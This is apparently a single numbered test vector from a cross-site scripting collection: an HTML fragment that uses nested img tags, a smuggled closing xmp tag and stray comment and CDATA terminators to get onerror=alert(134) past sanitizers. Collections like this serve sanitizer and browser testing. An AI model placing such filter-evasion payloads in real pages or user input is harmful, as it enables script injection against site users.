<div id="134">
&lt;%

<img alt="%></xmp><img src=xx onerror=alert(134)//">

 %&gt;/
alert(2)


XXX
<style>
*['<!--']{}
</style>
--&gt;{}
*{color:red}//["'`--&gt;]]&gt;]</div>
